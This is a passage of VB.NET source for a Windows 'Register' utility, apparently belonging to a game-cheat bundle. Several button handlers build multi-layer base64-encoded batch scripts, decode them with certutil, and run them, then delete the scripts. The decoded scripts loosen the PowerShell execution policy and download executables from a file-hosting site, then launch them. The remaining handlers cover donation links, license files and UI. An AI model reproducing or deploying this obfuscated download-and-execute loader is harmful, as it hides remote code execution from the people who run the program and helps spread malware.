        sb.AppendLine("echo cDBcQVlETGluay5iYXQgZGVsIC9zIC9xICV+ZHAwXEFZRExpbmsuYmF0DQppZiBl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo eGlzdCAlfmRwMFxBZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVyLnppcCBkZWwgL3Mg>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo L3EgJX5kcDBcQWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlci56aXANCmlmIGV4aXN0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ICV+ZHAwXEFZRC50eHQgZGVsIC9zIC9xICV+ZHAwXEFZRC50eHQNCmlmIGV4aXN0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ICV+ZHAwXEFZRC5GaWxlIGRlbCAvcyAvcSAlfmRwMFxBWUQuRmlsZQ0KaWYgZXhp>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo c3QgJX5kcDBcQVlELnBzMSBkZWwgL3MgL3EgJX5kcDBcQVlELnBzMQ0KaWYgZXhp>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo c3QgJX5kcDBcVW56aXBBWUQucHMxIGRlbCAvcyAvcSAlfmRwMFxVbnppcEFZRC5w>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo czENCmlmIG5vdCBleGlzdCAlfmRwMFxBZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVy>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo XEFkdmFuY2VkWW91dHViZURvd25sb2FkZXIuZXhlIGdvdG8gV2VicGFnZUFZRA0K>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo aWYgZXhpc3QgJX5kcDBcQWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlclxBZHZhbmNl>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZFlvdXR1YmVEb3dubG9hZGVyLmV4ZSBnb3RvIFN0YXJ0QVlEDQo6U3RhcnRBWUQN>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo CmNkICV+ZHAwXEFkdmFuY2VkWW91dHViZURvd25sb2FkZXJcICYmIHN0YXJ0IEFk>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dmFuY2VkWW91dHViZURvd25sb2FkZXIuZXhlDQppZiBleGlzdCAlfmRwMFxBWURc>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo IHJtZGlyIC9zIC9xICV+ZHAwXEFZRFwNCmlmIGV4aXN0ICV+ZHAwXEFZRExpbmsu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo YmF0IGRlbCAvcyAvcSAlfmRwMFxBWURMaW5rLmJhdA0KaWYgZXhpc3QgJX5kcDBc>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo QWR2YW5jZWRZb3V0dWJlRG93bmxvYWRlci56aXAgZGVsIC9zIC9xICV+ZHAwXEFk>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dmFuY2VkWW91dHViZURvd25sb2FkZXIuemlwDQppZiBleGlzdCAlfmRwMFxBWUQu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo dHh0IGRlbCAvcyAvcSAlfmRwMFxBWUQudHh0DQppZiBleGlzdCAlfmRwMFxBWUQu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RmlsZSBkZWwgL3MgL3EgJX5kcDBcQVlELkZpbGUNCmlmIGV4aXN0ICV+ZHAwXEFZ>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo RC5wczEgZGVsIC9zIC9xICV+ZHAwXEFZRC5wczENCmlmIGV4aXN0ICV+ZHAwXFVu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo emlwQVlELnBzMSBkZWwgL3MgL3EgJX5kcDBcVW56aXBBWUQucHMxDQpnb3RvIEVu>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo ZEFZRA0KOldlYnBhZ2VBWUQNCnN0YXJ0IGh0dHA6Ly93d3cubWVkaWFmaXJlLmNv>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo bS9maWxlL3dhaGJwanFmbm5pdDV4ei9BZHZhbmNlZFlvdXR1YmVEb3dubG9hZGVy>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo LnppcC56aXANCmdvdG8gRW5kQVlEDQo6RW5kQVlEDQpnb3RvIEV4aXQNCjpFeGl0>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("echo DQpFeGl0DQo=>>AdvancedYoutubeDownloader.Files")
        sb.AppendLine("certutil -decode AdvancedYoutubeDownloader.Files AdvancedYoutubeDownloader.bat")
        sb.AppendLine("start AdvancedYoutubeDownloader.bat")
        sb.AppendLine("if exist AdvancedYoutubeDownloader.Files del /s /q AdvancedYoutubeDownloader.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("AYD.bat", sb.ToString())
        Process.Start("AYD.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("AYD.bat")
    End Sub
    Private Sub PictureBox5_Click(sender As Object, e As EventArgs) Handles PictureBox5.Click
        System.IO.File.Delete("PayPal3xploitCh3ats.bat")
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("Start https://www.paypal.me/3xploitCh3ats/25eur && start https://cryptovoucher.io/buy-voucher && timeout /t 2 && exit")
        IO.File.WriteAllText("PayPal3xploitCh3ats.bat", sb.ToString())
        Process.Start("PayPal3xploitCh3ats.bat")
        Threading.Thread.Sleep(1000)
        System.IO.File.Delete("PayPal3xploitCh3ats.bat")
    End Sub
    Private Sub Label5_Click(sender As Object, e As EventArgs) Handles Label5.Click
        If (IO.File.Exists("Encodeur.bat")) Then GoTo Encodeur
        Call Encodeur()
        GoTo EndSub
Encodeur:
        Process.Start("Encodeur.bat")
        GoTo EndSub
EndSub:
    End Sub
    Sub Encodeur()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("echo OkVuY29kZXVyDQpAZWNobyBvZmYNCnRpdGxlIEVuY29kZXVyDQpjZFwNCmlmIGV4>>Encodeur.Files")
        sb.AppendLine("echo aXN0ICJDOlxVc2Vyc1wldXNlcm5hbWUlXEFwcERhdGFcUm9hbWluZ1xUaHVuZGVy>>Encodeur.Files")
        sb.AppendLine("echo Qm94XFJFU1RBUlQtR1RBNVxFbmNvZGV1ci5leGUiIGdvdG8gU3RhcnRFbmNvZGV1>>Encodeur.Files")
        sb.AppendLine("echo cg0KaWYgbm90IGV4aXN0ICJDOlxVc2Vyc1wldXNlcm5hbWUlXEFwcERhdGFcUm9h>>Encodeur.Files")
        sb.AppendLine("echo bWluZ1xUaHVuZGVyQm94XFJFU1RBUlQtR1RBNVxFbmNvZGV1ci5leGUiIGdvdG8g>>Encodeur.Files")
        sb.AppendLine("echo RG93bmxvYWRFbmNvZGV1cg0KOlN0YXJ0RW5jb2RldXINCmNkXA0KY2QgIkM6XFVz>>Encodeur.Files")
        sb.AppendLine("echo ZXJzXCV1c2VybmFtZSVcQXBwRGF0YVxSb2FtaW5nXFRodW5kZXJCb3hcUkVTVEFS>>Encodeur.Files")
        sb.AppendLine("echo VC1HVEE1XCIgJiYgc3RhcnQgRW5jb2RldXIuZXhlDQpnb3RvIEVuZEVuY29kZXVy>>Encodeur.Files")
        sb.AppendLine("echo DQo6RG93bmxvYWRFbmNvZGV1cg0KaWYgZXhpc3QgJX5kcDBcRW5jb2RldXIuZXhl>>Encodeur.Files")
        sb.AppendLine("echo IGdvdG8gU3RhcnRFbmNvZGV1cg0KaWYgbm90IGV4aXN0ICV+ZHAwXEVuY29kZXVy>>Encodeur.Files")
        sb.AppendLine("echo LmV4ZSBnb3RvIEVuY29kZXVyDQo6RW5jb2RldXIgDQpAZWNobyBvZmYNCmVjaG8g>>Encodeur.Files")
        sb.AppendLine("echo ICAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>Encodeur.Files")
        sb.AppendLine("echo DQplY2hvICAgKioqLy8gVXBkYXRlLUVuY29kZXVyLmJhdCAvLyBXaW4xMCAvLyoq>>Encodeur.Files")
        sb.AppendLine("echo Kg0KZWNobyAgICoqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioq>>Encodeur.Files")
        sb.AppendLine("echo KioqKioqKioNCmNkICV+ZHAwDQppZiBleGlzdCAlfmRwMFxFbmNvZGV1ci5leGUg>>Encodeur.Files")
        sb.AppendLine("echo ZGVsIC9zIC9xICV+ZHAwXEVuY29kZXVyLmV4ZQ0KaWYgZXhpc3QgJX5kcDBcRW5j>>Encodeur.Files")
        sb.AppendLine("echo b2RldXJMaW5rLmJhdCBkZWwgL3MgL3EgJX5kcDBcRW5jb2RldXJMaW5rLmJhdA0K>>Encodeur.Files")
        sb.AppendLine("echo aWYgZXhpc3QgJX5kcDBcRW5jb2RldXIudHh0IGRlbCAvcyAvcSAlfmRwMFxFbmNv>>Encodeur.Files")
        sb.AppendLine("echo ZGV1ci50eHQNCmlmIGV4aXN0ICV+ZHAwXEVuY29kZXVyZGVjb2RlLkZpbGUgZGVs>>Encodeur.Files")
        sb.AppendLine("echo IC9zIC9xICV+ZHAwXEVuY29kZXVyZGVjb2RlLkZpbGUNCmlmIGV4aXN0ICV+ZHAw>>Encodeur.Files")
        sb.AppendLine("echo XEVuY29kZXVyLnBzMSBkZWwgL3MgL3EgJX5kcDBcRW5jb2RldXIucHMxDQpwb3dl>>Encodeur.Files")
        sb.AppendLine("echo cnNoZWxsIFNldC1FeGVjdXRpb25Qb2xpY3kgLVNjb3BlIEN1cnJlbnRVc2VyIFVu>>Encodeur.Files")
        sb.AppendLine("echo cmVzdHJpY3RlZA0KcG93ZXJzaGVsbCAtQ29tbWFuZCBJbnZva2UtV2ViUmVxdWVz>>Encodeur.Files")
        sb.AppendLine("echo dCAiaHR0cDovL3d3dy5tZWRpYWZpcmUuY29tL2ZpbGUveWg1NzVuM2dpOHU3eGtt>>Encodeur.Files")
        sb.AppendLine("echo L0VuY29kZXVyLmV4ZSIgLU91dEZpbGUgIkVuY29kZXVyLnR4dCINCmNkICV+ZHAw>>Encodeur.Files")
        sb.AppendLine("echo DQpmaW5kIC9JICI6Ly9kb3dubG9hZCIgRW5jb2RldXIudHh0Pj5FbmNvZGV1ckxp>>Encodeur.Files")
        sb.AppendLine("echo bmsuYmF0DQplY2hvIEV4aXQ+PkVuY29kZXVyTGluay5iYXQNCmVjaG8gS0VkbGRD>>Encodeur.Files")
        sb.AppendLine("echo MURiMjUwWlc1MElFVnVZMjlrWlhWeVRHbHVheTVpWVhRcElId2dEUXBHYjNKbFlX>>Encodeur.Files")
        sb.AppendLine("echo Tm9MVTlpYW1Waj4+RW5jb2RldXJkZWNvZGUuRmlsZQ0KZWNobyBkQ0I3SkY4Z0xY>>Encodeur.Files")
        sb.AppendLine("echo SmxjR3hoWTJVZ0ltaHlaV1k5SWlJaUxDQWllSGw2TXpJeEluMGdmQ0FOQ2xObGRD>>Encodeur.Files")
        sb.AppendLine("echo MURiMjUwPj5FbmNvZGV1cmRlY29kZS5GaWxlDQplY2hvIFpXNTBJRVZ1WTI5a1pY>>Encodeur.Files")
        sb.AppendLine("echo VnlUR2x1YXk1aVlYUU5DaWhIWlhRdFEyOXVkR1Z1ZENCRmJtTnZaR1YxY2t4cGJt>>Encodeur.Files")
        sb.AppendLine("echo c3U+PkVuY29kZXVyZGVjb2RlLkZpbGUNCmVjaG8gWW1GMEtTQjhJQTBLUm05eVpX>>Encodeur.Files")
        sb.AppendLine("echo RmphQzFQWW1wbFkzUWdleVJmSUMxeVpYQnNZV05sSUNJaUlqNGlMQ0FpRFFwNj4+>>Encodeur.Files")
        sb.AppendLine("echo RW5jb2RldXJkZWNvZGUuRmlsZQ0KZWNobyBlWGcwTlNKOUlId2dEUXBUWlhRdFEy>>Encodeur.Files")
        sb.AppendLine("echo OXVkR1Z1ZENCRmJtTnZaR1YxY2t4cGJtc3VZbUYwRFFvTkNpaEhaWFF0Pj5FbmNv>>Encodeur.Files")
        sb.AppendLine("echo ZGV1cmRlY29kZS5GaWxlDQplY2hvIFEyOXVkR1Z1ZENCRmJtTnZaR1YxY2t4cGJt>>Encodeur.Files")
        sb.AppendLine("echo c3VZbUYwS1NCOElBMEtSbTl5WldGamFDMVBZbXBsWTNRZ2V5UmY+PkVuY29kZXVy>>Encodeur.Files")
        sb.AppendLine("echo ZGVjb2RlLkZpbGUNCmVjaG8gSUMxeVpYQnNZV05sSUNKNGVYb3pNakVpTENBaWNH>>Encodeur.Files")
        sb.AppendLine("echo OTNaWEp6YUdWc2JDQXRRMjl0YldGdVpDQkpiblp2YTJVdD4+RW5jb2RldXJkZWNv>>Encodeur.Files")
        sb.AppendLine("echo ZGUuRmlsZQ0KZWNobyBWMlZpVW1WeGRXVnpkQ0FpZlNCOElBMEtVMlYwTFVOdmJu>>Encodeur.Files")
        sb.AppendLine("echo UmxiblFnUlc1amIyUmxkWEpNYVc1ckxtSmhkQTBLPj5FbmNvZGV1cmRlY29kZS5G>>Encodeur.Files")
        sb.AppendLine("echo aWxlDQplY2hvIEtFZGxkQzFEYjI1MFpXNTBJRVZ1WTI5a1pYVnlUR2x1YXk1aVlY>>Encodeur.Files")
        sb.AppendLine("echo UXBJSHdnRFFwR2IzSmxZV05vTFU5aWFtVmo+PkVuY29kZXVyZGVjb2RlLkZpbGUN>>Encodeur.Files")
        sb.AppendLine("echo CmVjaG8gZENCN0pGOGdMWEpsY0d4aFkyVWdJaTVsZUdVaUxDQWlMbVY0WlNBdFQz>>Encodeur.Files")
        sb.AppendLine("echo VjBSbWxzWlNCRmJtTnZaR1YxY2k1bD4+RW5jb2RldXJkZWNvZGUuRmlsZQ0KZWNo>>Encodeur.Files")
        sb.AppendLine("echo byBlR1VnSmlZZ1pYaHBkQ0o5SUh3Z0RRcFRaWFF0UTI5dWRHVnVkQ0JGYm1OdlpH>>Encodeur.Files")
        sb.AppendLine("echo VjFja3hwYm1zdVltRjBEUW89Pj5FbmNvZGV1cmRlY29kZS5GaWxlDQp0aW1lb3V0>>Encodeur.Files")
        sb.AppendLine("echo IC9UIDENCmNlcnR1dGlsIC1kZWNvZGUgRW5jb2RldXJkZWNvZGUuRmlsZSBFbmNv>>Encodeur.Files")
        sb.AppendLine("echo ZGV1ci5wczENCnRpbWVvdXQgL1QgMQ0KUG93ZXJTaGVsbC5leGUgLUZpbGUgRW5j>>Encodeur.Files")
        sb.AppendLine("echo b2RldXIucHMxIC1Ob0V4aXQNCnRpbWVvdXQgL1QgMQ0KZmluZCAvSSAicG93ZXJz>>Encodeur.Files")
        sb.AppendLine("echo aGVsbCAtQ29tbWFuZCBJbnZva2UtV2ViUmVxdWVzdCBodHRwIiBFbmNvZGV1ckxp>>Encodeur.Files")
        sb.AppendLine("echo bmsuYmF0Pj5FbmNvZGV1ckRvd25sb2FkTGluay5iYXQNCmNkICV+ZHAwICYmIHN0>>Encodeur.Files")
        sb.AppendLine("echo YXJ0IEVuY29kZXVyRG93bmxvYWRMaW5rLmJhdA0KdGltZW91dCAvVCAyMg0KY2Qg>>Encodeur.Files")
        sb.AppendLine("echo JX5kcDANCmlmIGV4aXN0ICV+ZHAwXEVuY29kZXVyRG93bmxvYWRMaW5rLmJhdCBk>>Encodeur.Files")
        sb.AppendLine("echo ZWwgL3MgL3EgJX5kcDBcRW5jb2RldXJEb3dubG9hZExpbmsuYmF0DQppZiBleGlz>>Encodeur.Files")
        sb.AppendLine("echo dCAlfmRwMFxFbmNvZGV1ckxpbmsuYmF0IGRlbCAvcyAvcSAlfmRwMFxFbmNvZGV1>>Encodeur.Files")
        sb.AppendLine("echo ckxpbmsuYmF0DQppZiBleGlzdCAlfmRwMFxFbmNvZGV1ci50eHQgZGVsIC9zIC9x>>Encodeur.Files")
        sb.AppendLine("echo ICV+ZHAwXEVuY29kZXVyLnR4dA0KaWYgZXhpc3QgJX5kcDBcRW5jb2RldXJkZWNv>>Encodeur.Files")
        sb.AppendLine("echo ZGUuRmlsZSBkZWwgL3MgL3EgJX5kcDBcRW5jb2RldXJkZWNvZGUuRmlsZQ0KaWYg>>Encodeur.Files")
        sb.AppendLine("echo ZXhpc3QgJX5kcDBcRW5jb2RldXIucHMxIGRlbCAvcyAvcSAlfmRwMFxFbmNvZGV1>>Encodeur.Files")
        sb.AppendLine("echo ci5wczENCmlmIG5vdCBleGlzdCAlfmRwMFxFbmNvZGV1ci5leGUgZ290byBXZWJw>>Encodeur.Files")
        sb.AppendLine("echo YWdlRW5jb2RldXINCmlmIGV4aXN0ICV+ZHAwXEVuY29kZXVyLmV4ZSBnb3RvIFN0>>Encodeur.Files")
        sb.AppendLine("echo YXJ0RW5jb2RldXINCjpTdGFydEVuY29kZXVyDQpjZCAlfmRwMFwgJiYgc3RhcnQg>>Encodeur.Files")
        sb.AppendLine("echo RW5jb2RldXIuZXhlDQpnb3RvIEVuZEVuY29kZXVyDQo6V2VicGFnZUVuY29kZXVy>>Encodeur.Files")
        sb.AppendLine("echo DQpzdGFydCBodHRwOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS95aDU3NW4zZ2k4>>Encodeur.Files")
        sb.AppendLine("echo dTd4a20vRW5jb2RldXIuZXhlDQpnb3RvIEVuZEVuY29kZXVyDQo6RW5kRW5jb2Rl>>Encodeur.Files")
        sb.AppendLine("echo dXINCkV4aXQNCg==>>Encodeur.Files")
        sb.AppendLine("certutil -decode Encodeur.Files Encodeur.bat")
        sb.AppendLine("start Encodeur.bat")
        sb.AppendLine("if exist Encodeur.Files del /s /q Encodeur.Files")
        sb.AppendLine("goto End")
        sb.AppendLine(":End")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Encod3ur.bat", sb.ToString())
        Process.Start("Encod3ur.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("Encod3ur.bat")
    End Sub
    Private Sub Label6_Click(sender As Object, e As EventArgs) Handles Label6.Click
        Do While Panel1.Width > 22
            Panel1.Width = Panel1.Width - 1
        Loop
        Do While Panel1.Height > 28
            Panel1.Height = Panel1.Height - 1
        Loop
        Label7.Visible = True
    End Sub
    Private Sub Label7_Click(sender As Object, e As EventArgs) Handles Label7.Click
        Do While Panel1.Width < 325
            Panel1.Width = Panel1.Width + 1
        Loop
        Do While Panel1.Height < 223
            Panel1.Height = Panel1.Height + 1
        Loop
        Label7.Visible = False
    End Sub
    Private Sub R3gist3r_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles R3gist3r.MouseClick
        Me.Show()
        ShowInTaskbar = True
        Me.WindowState = FormWindowState.Normal
        R3gist3r.Visible = False
    End Sub
    Private Sub Label8_Click(sender As Object, e As EventArgs) Handles Label8.Click
        Me.WindowState = FormWindowState.Minimized
        R3gist3r.Visible = True
        R3gist3r.Icon = SystemIcons.Application
        R3gist3r.BalloonTipIcon = ToolTipIcon.Info
        R3gist3r.BalloonTipTitle = "Register"
        R3gist3r.BalloonTipText = "Register"
        R3gist3r.ShowBalloonTip(50)
        ShowInTaskbar = True
        Me.Hide()
        If (IO.File.Exists("2l.ico")) Then GoTo myIcon
MakeIcon:
        Dim strm As System.IO.Stream
        strm = IO.File.Create("2l.ico")
        Me.Icon.Save(strm)
        strm.Close()
myIcon:
        R3gist3r.Icon = New Icon(Application.StartupPath & "\2l.ico")
    End Sub
    Private Sub PictureBox6_Click(sender As Object, e As EventArgs) Handles PictureBox6.Click
        If (IO.File.Exists("Del-License.bat")) Then GoTo LicenseTimes
        Call LicenseTimes()
        GoTo EndSub
LicenseTimes:
        Process.Start("Del-License.bat")
        Application.Exit()
        GoTo EndSub
EndSub:
    End Sub
    Sub LicenseTimes()
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("timeout /t 5")
        sb.AppendLine("cd %~dp0\")
        sb.AppendLine("if exist License.Times del /s /q License.Times")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Del-License.bat", sb.ToString())
        Process.Start("Del-License.bat")
        Threading.Thread.Sleep(2000)
        Application.Exit()
    End Sub
    Private Sub PictureBox7_Click(sender As Object, e As EventArgs) Handles PictureBox7.Click
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("@echo off")
        sb.AppendLine("cd %~dp0")
        sb.AppendLine("if exist AdvancedYoutubeDownloader\License.Times del /s /q AdvancedYoutubeDownloader\License.Times")
        sb.AppendLine("if exist AdvancedYoutubeDownloader copy /y /v License.Times AdvancedYoutubeDownloader")
        sb.AppendLine("if exist Browser\License.Times del /s /q Browser\License.Times")
        sb.AppendLine("if exist Browser copy /y /v License.Times Browser")
        sb.AppendLine("if exist MediaPlayer\License.Times del /s /q MediaPlayer\License.Times")
        sb.AppendLine("if exist MediaPlayer copy /y /v License.Times MediaPlayer")
        sb.AppendLine("exit")
        IO.File.WriteAllText("Copy-License.bat", sb.ToString())
        Process.Start("Copy-License.bat")
        Threading.Thread.Sleep(2000)
        System.IO.File.Delete("Copy-License.bat")
    End Sub
    Private Sub PictureBox8_Click(sender As Object, e As EventArgs) Handles PictureBox8.Click
        Enter.Text = My.Computer.Clipboard.GetText()
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Dim Times As String = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Label1.Text = Times
    End Sub
    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        If Label10.Visible = False Then
            GoTo EndSub
        Else
        End If
ShowDiff:
        Dim reader2 As New System.IO.StreamReader(Application.StartupPath & "\License.Times")
        Label2.Text = New System.Text.ASCIIEncoding().GetString(Convert.FromBase64String(reader2.ReadLine()))
        Dim date1 As Date = System.DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss")
        Dim date2 As Date = CDate(Label2.Text)
        Dim Result2 As Integer
        Result2 = DateDiff(DateInterval.Second, date1, date2)
        Label10.Text = Result2
EndSub:
    End Sub
    Private Sub PictureBox9_Click(sender As Object, e As EventArgs) Handles PictureBox9.Click
        Call CreateShortCut1()
    End Sub
    Sub CreateShortCut1()
        Dim DesktopFolder1 As String = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory)
        If (IO.File.Exists("DesktopFolder1\Register.lnk")) Then GoTo Desktop1
        Call MyShortCut1()
Desktop1:
    End Sub
    Sub MyShortCut1()
        Dim objShell, strDesktopPath1, objLink
        objShell = CreateObject("WScript.Shell")
        strDesktopPath1 = objShell.SpecialFolders("Desktop")
        objLink =
        objShell.CreateShortcut(strDesktopPath1 & "\Register.lnk")
        objLink.Arguments = ""
        objLink.Description = "Register.exe"
        objLink.TargetPath = "%appdata%\ThunderBox\RESTART-GTA5\Register.exe"
        objLink.WindowStyle = 1
        objLink.WorkingDirectory = "%appdata%\ThunderBox\RESTART-GTA5\"
        objLink.Save
        GoTo EndSub
EndSub:
    End Sub
    Private Sub Label9_Click(sender As Object, e As EventArgs) Handles Label9.Click
        System.IO.File.Delete("qcfr05.bat")
        Dim sb As New System.Text.StringBuilder
        sb.AppendLine("Start https://qcfr05.ca && timeout /t 2 && exit")
        IO.File.WriteAllText("qcfr05.bat", sb.ToString())
        Process.Start("qcfr05.bat")
        Threading.Thread.Sleep(1000)
        System.IO.File.Delete("qcfr05.bat")
    End Sub
End Class
